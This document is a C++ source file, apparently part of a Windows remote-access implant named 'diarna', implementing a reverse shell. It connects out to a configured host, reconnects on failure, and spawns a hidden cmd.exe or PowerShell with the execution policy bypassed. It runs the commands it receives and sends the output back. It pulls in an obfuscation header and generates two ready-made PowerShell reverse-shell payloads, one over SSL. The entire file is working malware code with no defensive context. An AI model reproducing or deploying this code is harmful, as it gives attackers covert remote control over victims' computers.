#include <diarna/compiler_port.hpp>
#include <diarna/comm/reverse_shell.hpp>

#include <ws2tcpip.h>
#include <algorithm>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("ws2_32.lib")

namespace diarna::comm {

ReverseShell::ReverseShell(const ShellConfig& config) : config_(config) {
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
}

ReverseShell::~ReverseShell() { stop(); }

bool ReverseShell::start() {
    if (running_) return true;
    running_ = true;
    shell_thread_ = std::thread(&ReverseShell::shell_loop, this);
    recv_thread_ = std::thread(&ReverseShell::recv_loop, this);
    return true;
}

void ReverseShell::stop() {
    running_ = false;
    kill_shell();
    if (sock_ != INVALID_SOCKET) { closesocket(sock_); sock_ = INVALID_SOCKET; }
    connected_ = false;
    if (shell_thread_.joinable()) shell_thread_.join();
    if (recv_thread_.joinable()) recv_thread_.join();
}

bool ReverseShell::is_connected() const { return connected_; }

void ReverseShell::send_command(const std::string& cmd) {
    if (shell_stdin_write_) {
        std::string c = cmd + "\r\n";
        DWORD w; WriteFile(shell_stdin_write_, c.data(), (DWORD)c.size(), &w, nullptr);
    } else if (sock_ != INVALID_SOCKET && connected_) {
        std::string c = cmd + "\n";
        ::send(sock_, c.data(), (int)c.size(), 0);
    }
}

std::string ReverseShell::read_output(std::chrono::milliseconds timeout) {
    std::lock_guard lock(output_mutex_);
    if (output_queue_.empty()) return "";
    auto out = output_queue_.front();
    output_queue_.pop_front();
    return out;
}

void ReverseShell::set_output_callback(OutputCallback cb) { on_output_ = std::move(cb); }

void ReverseShell::shell_loop() {
    while (running_) {
        while (running_ && !connect_to_server())
            Sleep((DWORD)config_.reconnect.count() * 1000);

        if (!running_) break;

        if (!spawn_shell(config_.mode)) {
            connected_ = false;
            Sleep(5000);
            continue;
        }

        char buf[65536];
        while (running_ && connected_) {
            DWORD avail = 0;
            if (PeekNamedPipe(shell_stdout_read_, nullptr, 0, nullptr, &avail, nullptr) && avail > 0) {
                DWORD rd = 0;
                memset(buf, 0, sizeof(buf));
                if (ReadFile(shell_stdout_read_, buf,
                        std::min((DWORD)(sizeof(buf) - 1), avail), &rd, nullptr) && rd > 0) {
                    std::string out(buf, rd);
                    {
                        std::lock_guard lock(output_mutex_);
                        output_queue_.push_back(out);
                    }
                    if (on_output_) on_output_(out);
                    if (sock_ != INVALID_SOCKET && connected_)
                        ::send(sock_, out.data(), (int)out.size(), 0);
                }
            } else {
                Sleep(50);
            }
        }

        kill_shell();
    }
}

void ReverseShell::recv_loop() {
    char buf[65536];
    while (running_) {
        if (sock_ == INVALID_SOCKET || !connected_) {
            Sleep(1000);
            continue;
        }

        fd_set fds; FD_ZERO(&fds); FD_SET(sock_, &fds);
        timeval tv = {0, 100000};
        if (select(0, &fds, nullptr, nullptr, &tv) <= 0) continue;

        int n = recv(sock_, buf, sizeof(buf) - 1, 0);
        if (n <= 0) { connected_ = false; continue; }

        buf[n] = 0;
        if (shell_stdin_write_)
            send_command(buf);
        else
            send_command(buf);
    }
}

bool ReverseShell::connect_to_server() {
    sock_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_ == INVALID_SOCKET) return false;

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(config_.port);
    inet_pton(AF_INET, config_.host.c_str(), &addr.sin_addr);

    if (::connect(sock_, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(sock_); sock_ = INVALID_SOCKET; return false;
    }

    DWORD tmo = 30000;
    setsockopt(sock_, SOL_SOCKET, SO_RCVTIMEO, (char*)&tmo, sizeof(tmo));
    connected_ = true;
    return true;
}

bool ReverseShell::spawn_shell(Mode mode) {
    INDIRECT_BRANCH;
    kill_shell();

    SECURITY_ATTRIBUTES sa = {sizeof(sa), nullptr, TRUE};
    HANDLE stdin_r, stdin_w, stdout_r, stdout_w;
    CreatePipe(&stdin_r, &stdin_w, &sa, 0);
    CreatePipe(&stdout_r, &stdout_w, &sa, 0);
    SetHandleInformation(stdin_w, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(stdout_r, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = stdin_r;
    si.hStdOutput = stdout_w;
    si.hStdError = stdout_w;

    PROCESS_INFORMATION pi = {};
    std::wstring cmd;

    if (mode == Mode::PowerShell || mode == Mode::Both) {
        cmd = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
              L" -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden";
    } else {
        cmd = L"C:\\Windows\\System32\\cmd.exe";
    }

    if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(stdin_r); CloseHandle(stdin_w);
        CloseHandle(stdout_r); CloseHandle(stdout_w);
        return false;
    }

    CloseHandle(stdin_r);
    CloseHandle(stdout_w);
    CloseHandle(pi.hThread);

    shell_stdin_write_ = stdin_w;
    shell_stdout_read_ = stdout_r;
    shell_process_ = pi.hProcess;

    return true;
}

void ReverseShell::kill_shell() {
    if (shell_stdin_write_) { CloseHandle(shell_stdin_write_); shell_stdin_write_ = nullptr; }
    if (shell_stdout_read_) { CloseHandle(shell_stdout_read_); shell_stdout_read_ = nullptr; }
    if (shell_process_) {
        TerminateProcess(shell_process_, 0);
        CloseHandle(shell_process_);
        shell_process_ = nullptr;
    }
}

std::string ReverseShell::generate_powershell_payload() {
    return "$c=New-Object Net.Sockets.TCPClient('" + config_.host + "'," +
           std::to_string(config_.port) +
           ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0)"
           "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);"
           "$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);"
           "$s.Write($sb,0,$sb.Length);$s.Flush()}$c.Close()";
}

std::string ReverseShell::generate_powershell_ssl_payload() {
    return "$c=New-Object Net.Sockets.TCPClient('" + config_.host + "'," +
           std::to_string(config_.port) +
           ");$ssl=$c.GetStream();$s=new-object System.Net.Security.SslStream($ssl,$false,"
           "{$true});$s.AuthenticateAsClient('');[byte[]]$b=0..65535|%{0};"
           "while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object Text.ASCIIEncoding)"
           ".GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
           "$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
           "$c.Close()";
}

} // namespace diarna::comm
